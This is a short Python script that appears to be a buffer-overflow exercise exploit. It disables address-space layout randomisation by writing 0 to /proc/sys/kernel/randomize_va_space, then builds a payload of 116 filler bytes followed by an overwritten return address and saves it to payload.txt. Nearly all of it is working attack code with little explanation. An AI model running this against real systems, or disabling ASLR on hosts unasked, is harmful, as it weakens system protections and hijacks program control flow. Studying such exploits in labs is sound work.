import subprocess

# Executing shell command
def execute_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return process.returncode, stdout, stderr

# Disablig ASLR
command1 = "echo 0 > /proc/sys/kernel/randomize_va_space"
returncode, stdout, stderr = execute_command(command1)

if returncode != 0:
    print(f"Error executing command: {command1}")
    print(stderr.decode())
else:
    print(f"Successfully executed: {command1}")

# Writing the payload to a file
python_command = 'python3 -c \'import sys;sys.stdout.buffer.write(b"A"*116 +b"\\xd4\\x58\\x55\\x55\\x55\\x00\\x00\\x00")\''
output_file = "payload.txt"

try:
    # Execute the Python command and capture its output
    process = subprocess.Popen(python_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode != 0:
        print(f"Error executing Python command: {python_command}")
        print(stderr.decode())
    else:
        # Write the output to a file
        with open(output_file, "wb") as f:
            f.write(stdout)
        print(f"Output written to {output_file}")

except Exception as e:
    print(f"An error occurred: {e}")